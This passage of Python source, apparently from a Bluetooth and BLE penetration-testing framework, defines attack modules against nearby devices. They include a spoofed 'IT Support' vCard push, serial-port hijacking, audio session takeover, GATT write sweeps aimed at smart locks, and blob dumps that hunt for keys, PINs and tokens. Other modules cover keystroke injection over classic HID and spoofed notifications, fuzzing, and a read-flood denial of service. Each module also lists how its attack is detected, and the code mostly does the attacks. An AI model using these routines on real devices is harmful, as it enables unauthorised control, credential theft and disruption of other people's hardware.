        "file, and the store logs the session.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("obex")
        if device is None:
            return self._report(ctx, ap, attempt, "Bluetooth OBEX push: no object store",
                                "no device on the floor serves a push profile", {})
        card = ("BEGIN:VCARD\r\nVERSION:3.0\r\nFN:IT Support\r\nN:Support;IT;;;\r\n"
                "TEL;TYPE=WORK:+911140001234\r\nEMAIL:helpdesk@example.org\r\n"
                "END:VCARD\r\n").encode()
        sock = self.rfcomm(ctx, device.address, 1)
        response: Dict[str, Any] = {"bytes": len(card), "connected": sock is not None}
        if sock is not None:
            try:
                sock.send(bt.obex_connect())
                response["connect"] = sock.recv(1024).hex()[:16]
                # OBEX PUT: a connection id, the name, the length, then the body
                packet = (bt.obex_packet(bt.OBEX_PUT, final=True,
                                         extra=(bt.obex_name_header("it-support.vcf")
                                                + bytes([0x49]) + struct.pack(">H", len(card))
                                                + card)))
                sock.send(packet)
                response["answer"] = sock.recv(4096).hex()[:24]
            except Exception as exc:                             # pragma: no cover
                response["error"] = str(exc)
        parsed = bt.parse_obex_packet(bytes.fromhex(response.get("answer") or "")) \
            if response.get("answer") else {}
        response["accepted"] = bool(parsed.get("response") == "OK")
        response["response"] = parsed.get("response", "")
        extra = {"device": device.to_dict(), "push": response, "card": card.decode(),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if response.get("connected"):
            title = f"Bluetooth OBEX push: {device.name} took the object"
            detail = (f"a vCard of {len(card)} bytes was pushed to the object store and "
                      f"answered {response.get('response') or response.get('answer') or 'nothing'}"
                      f": an unsolicited contact is an unsolicited instruction")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="medium")
        title = "Bluetooth OBEX push: no object store answered"
        detail = "the device offers no push channel on the channel that was asked for"
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleSppHijackAttack(_Takeover):
    """Take the serial port: the raw profile a printer, a scale or an HMI listens on."""

    name = "ble_spp_hijack"
    role = "rfcomm"
    label = "Bluetooth SPP hijack (write to a serial port profile)"
    category = "rogue"
    noise = "moderate"
    impact = "degraded"
    tool = "wifipilot blesim.py (RFCOMM raw)"
    devices = ("bt_printer", "bt_headset")

    description = (
        "The serial port profile is a socket with no idea what is inside it: a label "
        "printer takes ZPL, a scale answers a weight, an HMI takes a command.  This finds "
        "the channel a device offers, writes to it and reports the bytes that came back — "
        "and a serial port that answers a stranger is a control channel.")
    detection = (
        "A device taking bytes on SPP from an address that is not its host: the printer or "
        "the scale logs the connection, and the label stock changes.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("rfcomm")
        if device is None:
            return self._report(ctx, ap, attempt, "Bluetooth SPP hijack: no serial channel",
                                "no device on the floor offers RFCOMM", {})
        channels = list(device.channels) or [1]
        attempts: List[Dict[str, Any]] = []
        for channel in channels[:3]:
            sock = self.rfcomm(ctx, device.address, channel)
            if sock is None:
                attempts.append({"channel": channel, "opened": False, "answer": ""})
                continue
            payload = b"^XA^FO40,40^A0N,40,40^FDASSESSMENT^FS^XZ\r\n"
            try:
                sock.send(payload)
                answer = sock.recv(4096)
            except Exception as exc:                             # pragma: no cover
                answer = str(exc).encode()
            attempts.append({"channel": channel, "opened": True, "sent": len(payload),
                             "answer": answer.decode("latin-1", "replace")[:160],
                             "bytes": len(answer)})
        opened = [row for row in attempts if row.get("opened")]
        answered = [row for row in opened if row.get("answer")]
        extra = {"device": device.to_dict(), "channels": attempts,
                 "opened": len(opened), "answered": len(answered),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if opened:
            title = (f"Bluetooth SPP hijack: {len(opened)} channel(s) open on "
                     f"{device.name}")
            detail = (f"wrote a print job to channel "
                      f"{opened[0]['channel']} and read back "
                      f"{opened[0].get('answer') or 'nothing'!r}: the serial profile takes "
                      f"input from whoever opens it")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = f"Bluetooth SPP hijack: {device.name} refused every channel"
        detail = f"asked for channel(s) {channels[:3]} and none opened"
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleDialHijackAttack(_Takeover):
    """DIAL: launch an application on a television by asking its own API."""

    name = "ble_dial_hijack"
    role = "obex"
    label = "Bluetooth DIAL hijack (launch an app on a media device)"
    category = "rogue"
    noise = "quiet"
    impact = "degraded"
    tool = "wifipilot blesim.py (OBEX GET on the app endpoint)"
    devices = ("smart_tv", "speaker")

    description = (
        "DIAL is how a phone launches an app on a television: an HTTP request carried over "
        "OBEX, answered by whichever device is listening.  This asks for the application "
        "list and reports what the device says it can start — a content path and a launch "
        "endpoint are a screen an attacker can put something on.")
    detection = (
        "An app launch from a device that is not the phone: the television logs the DIAL "
        "session, and the screen changes.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("obex") or self.aim_at("rfcomm")
        if device is None:
            return self._report(ctx, ap, attempt, "Bluetooth DIAL hijack: no media device",
                                "no device on the floor serves an object store", {})
        listing = self.obex(ctx, device.address, "x-obex/folder-listing")
        apps = self.obex(ctx, device.address, "/apps")
        raw = bytes.fromhex(str(apps.get("raw") or "")) if apps.get("raw") else b""
        extra = {"device": device.to_dict(), "listing": listing, "apps": apps,
                 "app_bytes": len(raw), "simulated": bool(getattr(ctx, "demo", False))}
        if apps.get("bytes") or listing.get("bytes"):
            title = f"Bluetooth DIAL hijack: {device.name} answered the app endpoint"
            detail = (f"the folder listing returned {listing.get('bytes', 0)} byte(s) and "
                      f"the app endpoint {apps.get('bytes', 0)} byte(s): a device that "
                      f"answers DIAL to an unpaired client can be made to launch something")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = "Bluetooth DIAL hijack: the app endpoint answered nothing"
        detail = f"the OBEX session returned {apps.get('bytes', 0)} byte(s)"
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleHidpClassicInjectAttack(_Takeover):
    """Type on a classic HID host: the HIDP channel, exactly as a keyboard uses it."""

    name = "ble_hidp_classic_inject"
    role = "classic_hid"
    label = "Bluetooth HIDP injection (classic keystrokes over PSM 0x0013)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "critical"
    tool = "wifipilot bt.py (HIDP frames) + blesim.py"
    devices = ("bt_keyboard", "bt_headset")

    description = (
        "A classic keyboard hands its host eight-byte input reports over the HID interrupt "
        "channel.  This opens that channel, sends the reports for a payload and reports "
        "whether the host took them — the classic half of the injection the BLE wave does "
        "over GATT, and the half that predates bonding in a lot of products.")
    detection = (
        "Input reports on a HID channel the host did not initiate: the host's input stack "
        "logs the device, and the keystrokes appear in whatever has focus.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("classic_hid")
        if device is None:
            return self._report(ctx, ap, attempt, "Bluetooth HIDP injection: no HID host",
                                "no device on the floor takes classic HID input", {})
        payload = self.payload(ctx)
        reports = bt.hid_key_reports(payload)
        handshake = bt.parse_hidp(self.hidp(ctx, device.address, bt.hidp_handshake()))
        sent = 0
        for report in reports:
            answer = self.hidp(ctx, device.address, bt.hidp_frame(0x0A, 0x01, report))
            if answer:
                handshake = bt.parse_hidp(answer)
            sent += 1
        state = self.link_state(device.address, "classic_hid")
        extra = {"device": device.to_dict(), "handshake": handshake, "sent": sent,
                 "reports": len(reports), "keystrokes": len(reports) // 2,
                 "payload": payload, "bonded": bool(state.get("bonded")),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if sent and not not handshake.get("accepted"):
            title = (f"Bluetooth HIDP injection: {len(reports)} report(s) into "
                     f"{device.name}")
            detail = (f"the HID channel accepted the handshake and {sent} input report(s) "
                      f"for {payload!r}: {len(reports) // 2} keystroke(s) on the machine")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="critical")
        title = f"Bluetooth HIDP injection: {device.name} refused the channel"
        detail = (f"the handshake answered "
                  f"{handshake.get('result_name') or 'nothing'}, which is a host that "
                  f"takes input only over an encrypted link")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleAudioSessionTakeoverAttack(_Takeover):
    """Take an audio session: configure the stream, then press the buttons."""

    name = "ble_audio_session_takeover"
    role = "audio"
    label = "Bluetooth audio takeover (configure AVDTP and drive AVRCP)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    tool = "wifipilot bt.py (AVDTP + AVCTP/AVRCP) + blesim.py"
    devices = ("bt_headset", "speaker")

    description = (
        "An A2DP stream is negotiated before a note is played: discover the endpoints, "
        "read the codec, configure the stream, start it.  This does all four and then uses "
        "the remote control — play, pause, absolute volume — so the finding is a session "
        "that answers, and the transport belongs to whoever holds it.")
    detection = (
        "An audio configuration from a device that is not the paired phone: the speaker "
        "logs the AVDTP session and the AVRCP notifications go to a second controller.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("audio")
        if device is None:
            return self._report(ctx, ap, attempt, "Bluetooth audio takeover: no sink",
                                "no device on the floor serves an audio link", {})
        signals: List[Dict[str, Any]] = []
        for command in (bt.avdtp_discover(), bt.avdtp_get_capabilities(1),
                        bt.avdtp_set_configuration(1), bt.avdtp_simple(0x07, 1)):
            answer = self.avdtp(ctx, device.address, command)
            parsed = bt.parse_avdtp(answer) if answer else {}
            signals.append({"signal": bt.parse_avdtp(command)["signal_name"],
                            "status": parsed.get("status", "no answer"),
                            "codec": next((category.get("codec") for category in
                                           parsed.get("categories") or []
                                           if category.get("codec")), ""),
                            "answered": bool(answer)})
        controls: List[Dict[str, Any]] = []
        for frame in (bt.avctp_frame(bt.avrcp_passthrough(0x44)),
                      bt.avctp_frame(bt.avrcp_set_absolute_volume(0x4E)),
                      bt.avctp_frame(bt.avrcp_register(0x01, interval=1000))):
            answer = self.avrcp(ctx, device.address, frame)
            body = bt.parse_avctp(answer).get("payload") if answer else b""
            controls.append({"command": bt.parse_avrcp(frame)["name"],
                             "answer": bt.parse_avrcp(body, response=True) if body else {},
                             "answered": bool(answer)})
        accepted = [row for row in signals if row["answered"]]
        codec = next((row["codec"] for row in signals if row["codec"]), "")
        extra = {"device": device.to_dict(), "signals": signals, "controls": controls,
                 "codec": codec, "accepted": len(accepted),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if accepted:
            title = (f"Bluetooth audio takeover: {len(accepted)} AVDTP signal(s) accepted "
                     f"by {device.name}")
            detail = (f"the stream was discovered and configured"
                      + (f" for {codec}" if codec else "")
                      + f", and {len([row for row in controls if row['answered']])} "
                        f"AVRCP command(s) were answered: play, pause and the volume are "
                        f"the attacker's")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = f"Bluetooth audio takeover: {device.name} refused the stream"
        detail = (f"the device answered {len(signals)} signal(s) and refused the "
                  f"configuration, which is what a sink that checks the link key does")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleL2capPsmSweepAttack(_Takeover):
    """Ask for every PSM: what the device actually offers, one connection at a time."""

    name = "ble_l2cap_psm_sweep"
    role = "l2cap"
    label = "Bluetooth PSM sweep (which profiles the device really offers)"
    category = "discovery"
    noise = "quiet"
    impact = "info"
    finding_severity = "medium"
    tool = "wifipilot bt.py (L2CAP signalling)"

    description = (
        "A device's real attack surface is not its SDP record, it is the set of PSMs that "
        "answer a connection request.  This asks for all fourteen the specification "
        "reserves and reports which ones replied with an open channel — the map that "
        "decides which of the other attacks can run.")
    detection = (
        "A burst of connection requests from one address: the device's controller logs the "
        "signalling exchange, and the profile services log the connections.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("l2cap")
        if device is None:
            return self._report(ctx, ap, attempt, "Bluetooth PSM sweep: nothing to ask",
                                "no connectable device on the floor", {})
        sweep = self.psm_sweep(device.address, role="l2cap")
        open_rows = [row for row in sweep if row.get("accepted")]
        refused = [row for row in sweep if not row.get("accepted")]
        extra = {"device": device.to_dict(), "psms": sweep, "open": len(open_rows),
                 "refused": len(refused), "asked": len(sweep),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if open_rows:
            named = ", ".join(f"{row['label']} (0x{row['psm']:04x})" for row in open_rows)
            title = (f"Bluetooth PSM sweep: {len(open_rows)} of {len(sweep)} PSM(s) open on "
                     f"{device.name}")
            detail = (f"{named}; the rest answered "
                      f"{refused[0].get('reason', 'nothing') if refused else 'nothing'}: "
                      f"each open PSM is a profile an attack can talk to")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="medium")
        title = f"Bluetooth PSM sweep: {device.name} refused every PSM"
        detail = f"all {len(sweep)} connection request(s) were turned down"
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleSdpBrowseAttack(_Takeover):
    """Read the service records: the inventory a device publishes about itself."""

    name = "ble_sdp_browse_takeover"
    role = "sdp"
    label = "Bluetooth SDP takeover (read every service record)"
    category = "discovery"
    noise = "quiet"
    impact = "info"
    finding_severity = "low"
    tool = "wifipilot bt.py (SDP search + attribute decode)"

    description = (
        "Every classic device publishes a service record list: the profiles it speaks, "
        "their versions, and often the channel numbers and even the model.  This browses "
        "the list and reports the profile UUIDs, which is the fastest way to decide which "
        "of the other attacks in this wave apply.")
    detection = (
        "A service search from an address that is not the pairing device: the SDP server "
        "logs the browse, and it is indistinguishable from a legitimate one — which is the "
        "point.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("sdp")
        if device is None:
            return self._report(ctx, ap, attempt, "Bluetooth SDP browse: no records",
                                "no device on the floor serves SDP", {})
        opened = self.l2cap_open(device.address, 0x0001, role="sdp")
        records: List[Dict[str, Any]] = []
        if opened.get("accepted"):
            body, _parsed = self.l2cap_send(device.address, int(opened["cid"]),
                                            bt.sdp_service_search_attribute(), role="sdp")
            records = list(bt.parse_sdp(body).get("records") or []) if body else []
        profiles = sorted({int(uuid) for record in records
                           for uuid in (record.get("uuids") or [])})
        state = self.link_state(device.address, "sdp")
        extra = {"device": device.to_dict(), "opened": opened, "records": records,
                 "profiles": [f"0x{uuid:04x}" for uuid in profiles],
                 "channel_hint": [int(record.get("channel") or 0) for record in records],
                 "simulated": bool(getattr(ctx, "demo", False))}
        if records:
            channels = sorted({int(record.get(channel_key) or 0)
                               for record in records
                               for channel_key in ("channel", "server_channel")})
            title = (f"Bluetooth SDP browse: {len(records)} record(s), {len(profiles)} "
                     f"profile(s) on {device.name}")
            detail = (f"the browse answered {len(records)} service record(s) and named "
                      f"{', '.join(f'0x{uuid:04x}' for uuid in profiles[:6])} on channel(s) "
                      f"{channels}: the client's own list of what the device offers")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="low")
        title = f"Bluetooth SDP browse: {device.name} answered nothing"
        detail = f"the SDP channel {'opened' if opened.get('accepted') else 'was refused'}"
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


# --------------------------------------------------------------------------- #
# 2. the attribute table
# --------------------------------------------------------------------------- #

class BleGattWriteSweepAttack(_Takeover):
    """Write every writable characteristic, and read back which ones kept it."""

    name = "ble_gatt_write_sweep"
    role = "gatt"
    label = "BLE GATT write sweep (write the whole table, read it back)"
    category = "rogue"
    noise = "loud"
    impact = "outage"
    finding_severity = "high"
    tool = "wifipilot blesim.py (ATT write + read-back)"
    devices = ("bt_lock", "smart_lock", "ble_sensor")

    description = (
        "A device's writable characteristics are its inputs: a lock control, an admin key, "
        "a set point, a mode.  This writes each one with a marker value and reads it back, "
        "so the report is the list of controls the device accepted from a stranger rather "
        "than the list of writes that were sent.")
    detection = (
        "A burst of writes across one attribute table: the device logs the ATT session per "
        "characteristic, and the values it serves have changed.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("gatt")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE GATT write sweep: no table",
                                "no device on the floor serves an attribute table", {})
        rows = [row for row in self.characteristics(device.address) if row.get("writable")]
        results: List[Dict[str, Any]] = []
        for row in rows[:16]:
            handle = int(row["handle"])
            value = bytes([0x01]) + bytes(min(3, max(0, len(row.get("value") or b"") - 1)))
            write = self.att_write(device.address, handle, value)
            raw, _parsed = self.att_read(device.address, handle)
            results.append({"uuid": f"0x{int(row['uuid']):04x}", "name": row.get("name", ""),
                            "handle": f"0x{handle:04x}", "accepted":
                            bool(write.get("accepted")), "error": write.get("error", ""),
                            "read_back": raw.hex(), "confirmed": raw == value})
        confirmed = [row for row in results if row.get("confirmed")]
        accepted = [row for row in results if row.get("accepted")]
        extra = {"device": device.to_dict(), "writable": len(rows), "writes": results,
                 "accepted": len(accepted), "confirmed": len(confirmed),
                 "state": self.link_state(device.address),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if confirmed:
            first = confirmed[0]
            title = (f"BLE GATT write sweep: {len(confirmed)}/{len(rows)} control(s) "
                     f"changed on {device.name}")
            detail = (f"{first['name'] or first['uuid']} took the marker and read it back "
                      f"({first['read_back']})"
                      + (f"; {len(accepted) - len(confirmed)} write(s) acknowledged but not "
                         f"confirmed" if len(accepted) > len(confirmed) else "")
                      + ": a control a stranger can set is a control that is not the "
                        "device's own")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = (f"BLE GATT write sweep: {device.name} refused all {len(rows)} writable "
                 f"control(s)")
        detail = (f"{len(results)} write(s) were answered with "
                  f"{results[0]['error'] if results else 'nothing'}: a table that refuses "
                  f"the writes is a device that checks the link")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleGattBlobDumpAttack(_Takeover):
    """Read a value in parts: the long attribute a single read cannot carry."""

    name = "ble_gatt_blob_dump"
    role = "gatt"
    label = "BLE GATT blob dump (read a value in parts)"
    category = "discovery"
    noise = "quiet"
    impact = "loot"
    tool = "wifipilot blesim.py (Read Blob)"
    devices = ("ble_sensor", "smart_bulb", "fitness_tracker")

    description = (
        "A characteristic can be longer than one ATT read carries, and the Read Blob "
        "operation exists to ask for the part that is missing.  This walks every readable "
        "characteristic with an offset, reassembles what comes back and reports the values "
        "that are worth having — a report map, a certificate, a log buffer.")
    detection = (
        "Repeated reads of one handle with rising offsets: an ATT log shows one client "
        "walking the value, which is what a legitimate client does too — the difference is "
        "that this one is not the paired app.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("gatt")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE GATT blob dump: no table",
                                "no device on the floor serves an attribute table", {})
        dumps: List[Dict[str, Any]] = []
        for row in self.characteristics(device.address)[:14]:
            if row.get("value") is None:
                continue
            handle = int(row["handle"])
            chunks: List[bytes] = []
            for offset in (0, 16, 32):
                payload, _parsed = self.att(device.address, bytes([0x0C])
                                            + struct.pack("<HH", handle, offset))
                if payload[:1] != b"\x0B" or not payload[1:]:
                    break
                chunks.append(payload[1:])
                if len(payload) < 20:
                    break
            value = b"".join(chunks)
            dumps.append({"uuid": f"0x{int(row['uuid']):04x}", "name": row.get("name", ""),
                          "handle": f"0x{handle:04x}", "bytes": len(value),
                          "value": value.hex()[:64],
                          "text": value.decode("latin-1", "replace")[:40],
                          "chunks": len(chunks)})
        readable = [row for row in dumps if row["bytes"]]
        interesting = [row for row in readable
                       if any(word in row["text"].lower() for word in
                              ("key", "serial", "admin", "pin", "secret", "token"))]
        extra = {"device": device.to_dict(), "characteristics": dumps,
                 "readable": len(readable), "interesting": len(interesting),
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE GATT blob dump: {len(readable)} value(s) read from {device.name}")
        detail = (f"{len(readable)} characteristic(s) answered in "
                  f"{sum(row['chunks'] for row in readable)} chunk(s)"
                  + (f"; {interesting[0]['name'] or interesting[0]['uuid']} reads "
                     f"{interesting[0]['text']!r}" if interesting else "")
                  + f": the value is the peer's to hand over, and it handed it over")
        return self._report(ctx, ap, attempt, title, detail, extra,
                            severity="high" if interesting else "medium")


class BleGattHandleEnumAttack(_Takeover):
    """Walk the whole handle space: what answers, and what the device refuses to admit."""

    name = "ble_gatt_handle_enum"
    role = "gatt"
    label = "BLE handle enumeration (Find Information across the table)"
    category = "discovery"
    noise = "quiet"
    impact = "info"
    tool = "wifipilot blesim.py (Find Information + ATT error decoding)"
    devices = ("ble_sensor", "smart_bulb")

    description = (
        "Find Information answers with every handle and UUID in the range it is asked "
        "about.  This walks the range in blocks, reports the table it assembled, and counts "
        "the handles the device serves against the ones it says are not there — which is "
        "the difference between a device's real table and its documentation.")
    detection = (
        "A client walking the handle range in blocks: the ATT log shows the Find "
        "Information requests, and the device answers all of them because the operation is "
        "not restricted.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("gatt")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE handle enumeration: no table",
                                "no device on the floor serves an attribute table", {})
        found: List[Dict[str, Any]] = []
        refusals = 0
        for start in (0x0001, 0x0020, 0x0060, 0x00A0, 0xFF00):
            rows = self.find_info(device.address, start, min(start + 0x1F, 0xFFFF))
            if not rows:
                refusals += 1
            found.extend(rows)
        handles = sorted({int(row["handle"]) for row in found})
        extra = {"device": device.to_dict(), "entries": found, "handles": len(handles),
                 "first": handles[0] if handles else 0,
                 "last": handles[-1] if handles else 0,
                 "empty_ranges": refusals,
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE handle enumeration: {len(handles)} handle(s) answered on "
                 f"{device.name}")
        detail = (f"Find Information returned {len(found)} entry(ies) over "
                  f"{len(handles)} handle(s)"
                  + (f" from 0x{handles[0]:04x} to 0x{handles[-1]:04x}" if handles else "")
                  + f", with {refusals} range(s) empty: the table is discoverable by any "
                    f"client that asks")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="medium")


class BleGattCharFuzzAttack(_Takeover):
    """Fuzz the characteristics: what a device does with a value it did not expect."""

    name = "ble_gatt_char_fuzz"
    role = "gatt"
    label = "BLE characteristic fuzz (write malformed values, count the answers)"
    category = "dos"
    noise = "loud"
    impact = "degraded"
    tool = "wifipilot blesim.py (ATT write fuzzing)"
    devices = ("bt_headset", "ble_sensor")

    description = (
        "Four payloads per characteristic — empty, long, all ones, and a length the "
        "attribute cannot hold — and the error each one produced.  A device that answers "
        "with the specification's error codes is a device that validates; one that stops "
        "answering has taken the frame into its own parser.")
    detection = (
        "A run of malformed ATT writes: the device's log carries the errors, and a stack "
        "that handles them badly shows up as a disconnect.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("gatt")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE characteristic fuzz: no table",
                                "no device on the floor serves an attribute table", {})
        payloads = (b"", b"\xff" * 4, b"A" * 64, b"\x00\x00\x00\x00\x00\x00\x00\x01")
        results: List[Dict[str, Any]] = []
        for row in self.characteristics(device.address)[:8]:
            handle = int(row["handle"])
            for payload in payloads:
                write = self.att_write(device.address, handle, payload)
                results.append({"handle": f"0x{handle:04x}",
                                "uuid": f"0x{int(row['uuid']):04x}",
                                "length": len(payload), "accepted":
                                bool(write.get("accepted")),
                                "error": write.get("error", ""),
                                "answer": write.get("answer", "")})
        errors = sorted({row["error"] for row in results if row["error"]})
        accepted = [row for row in results if row["accepted"]]
        extra = {"device": device.to_dict(), "fuzz": results, "errors": errors,
                 "accepted": len(accepted), "attempts": len(results),
                 "state": self.link_state(device.address),
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE characteristic fuzz: {len(errors)} distinct error(s) from "
                 f"{device.name}")
        detail = (f"{len(results)} malformed write(s) produced {len(errors)} answer(s) "
                  f"({', '.join(errors[:4]) or 'none'}) and "
                  f"{len(accepted)} write(s) landed: the device answers with codes rather "
                  f"than silence, which is a parser that validates")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="medium")


class BleGattReadFloodAttack(_Takeover):
    """Read the same attribute as fast as the link allows, and watch it stop answering."""

    name = "ble_gatt_read_flood"
    role = "gatt"
    label = "BLE read flood (resource exhaustion on the attribute server)"
    category = "dos"
    noise = "loud"
    impact = "degraded"
    tool = "wifipilot blesim.py (repeated ATT reads)"
    devices = ("ble_sensor", "smart_bulb", "bt_headset")

    description = (
        "An attribute server answers reads one at a time, and every answer costs it radio "
        "time and a buffer.  This sends sixty reads to one handle and reports how many "
        "were answered, how long the device kept answering, and whether the link survived "
        "— the cheapest denial-of-service in the BLE toolkit, and the one nobody logs.")
    detection = (
        "Sixty reads of one attribute from one connection: the device's ATT log shows the "
        "burst, and its battery graph shows the cost.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("gatt")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE read flood: no table",
                                "no device on the floor serves an attribute table", {})
        readable = [row for row in self.characteristics(device.address)
                    if row.get("value") is not None]
        handle = int(readable[0]["handle"]) if readable else 0
        import time
        answers: List[int] = []
        started = time.time()
        for _index in range(60):
            payload, _parsed = self.att(device.address, bytes([0x0A])
                                        + struct.pack("<H", handle))
            answers.append(len(payload))
        elapsed = max(1e-6, time.time() - started)
        answered = [length for length in answers if length]
        state = self.link_state(device.address)
        extra = {"device": device.to_dict(), "handle": f"0x{handle:04x}",
                 "requests": len(answers), "answered": len(answered),
                 "refused": len(answers) - len(answered),
                 "bytes": sum(answered), "seconds": round(elapsed, 4),
                 "per_second": round(len(answers) / elapsed, 1), "state": state,
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE read flood: {len(answered)}/{len(answers)} read(s) answered by "
                 f"{device.name}")
        detail = (f"{len(answers)} reads of 0x{handle:04x} produced {sum(answered)} byt"
                  f"e(s) in {elapsed:.3f}s ({extra['per_second']}/s) and the link "
                  f"{'survived' if state.get('alive', True) else 'dropped'}: one client can "
                  f"hold a device's radio and its battery for as long as it likes")
        return self._report(ctx, ap, attempt, title, detail, extra,
                            severity="medium" if state.get("alive", True) else "high")


class BleMtuAbuseAttack(_Takeover):
    """Negotiate the largest MTU the peer will admit, then the smallest."""

    name = "ble_mtu_negotiation_abuse"
    role = "gatt"
    label = "BLE MTU negotiation abuse (what the peer will admit to)"
    category = "discovery"
    noise = "quiet"
    impact = "info"
    tool = "wifipilot blesim.py (Exchange MTU)"
    devices = ("ble_sensor", "smart_bulb")

    description = (
        "Exchange MTU is the first thing a client says, and the answer is the peer's real "
        "buffer size.  This asks for the maximum, then for the minimum, and reports the "
        "pair — a device that answers 517 to a stranger is a device whose memory somebody "
        "else decides how to use.")
    detection = (
        "Two MTU exchanges on one connection: legitimate clients negotiate once, and a "
        "second exchange is either a re-connection or a probe.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("gatt")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE MTU abuse: no table",
                                "no device on the floor serves an attribute table", {})
        probes: List[Dict[str, Any]] = []
        for requested in (517, 185, 23, 0):
            payload, parsed = self.att(device.address, bytes([0x02])
                                       + struct.pack("<H", requested))
            negotiated = int.from_bytes(payload[1:3], "little") if len(payload) >= 3 else 0
            probes.append({"requested": requested, "negotiated": negotiated,
                           "accepted": payload[:1] == b"\x03",
                           "error": parsed.get("error_text", "") if payload[:1] == b"\x01"
                           else ""})
        best = max((row["negotiated"] for row in probes), default=0)
        delta = best - min((row["requested"] for row in probes), default=0)
        extra = {"device": device.to_dict(), "probes": probes, "largest": best,
                 "spread": delta, "simulated": bool(getattr(ctx, "demo", False))}
        title = f"BLE MTU abuse: {device.name} admitted an MTU of {best}"
        detail = (f"the peer answered {best} for the largest request and "
                  f"{min((row['negotiated'] for row in probes), default=0)} for the "
                  f"smallest: its receive buffer is {best} bytes, which is what a fragmented "
                  f"write can try to fill")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="low")


class BleNotifySpoofAttack(_Takeover):
    """Send a notification as if it came from the device: the value the host trusts."""

    name = "ble_notify_spoof"
    role = "hid"
    label = "BLE notification spoof (a notification the host did not ask for)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "critical"
    tool = "wifipilot blesim.py (Handle Value Notification)"
    devices = ("bt_keyboard", "smart_tv")

    description = (
        "A notification is a push with no request in front of it: the host subscribed once, "
        "and every value that arrives afterwards is treated as the device's own.  This "
        "sends a notification on the report characteristic of a host that takes input and "
        "reports what the host did with it.")
    detection = (
        "Input notifications from a peripheral that is not connected: the host's input "
        "stack logs the report, and the device list has no matching connection.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("hid")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE notification spoof: no host",
                                "no device on the floor takes notifications", {})
        payload = self.payload(ctx)
        reports = bt.hid_key_reports(payload)
        sent = 0
        for report in reports:
            self.att(device.address, bytes([0x1B]) + struct.pack(
                "<H", self.handle_of(device.address, 0x2A4D) or 0x0005) + bytes(report))
            sent += 1
        link = self.floor().link_for(device.address, "hid")
        typed = link.hid_text if link is not None else ""
        received = len(link.hid_reports) if link is not None else 0
        extra = {"device": device.to_dict(), "sent": sent, "received": received,
                 "typed": typed, "payload": payload,
                 "handle": f"0x{(self.handle_of(device.address, 0x2A4D) or 0x0005):04x}",
                 "simulated": bool(getattr(ctx, "demo", False))}
        if received:
            title = (f"BLE notification spoof: {received} report(s) accepted by "
                     f"{device.name}")
            detail = (f"notifications with no connection in front of them were taken as "
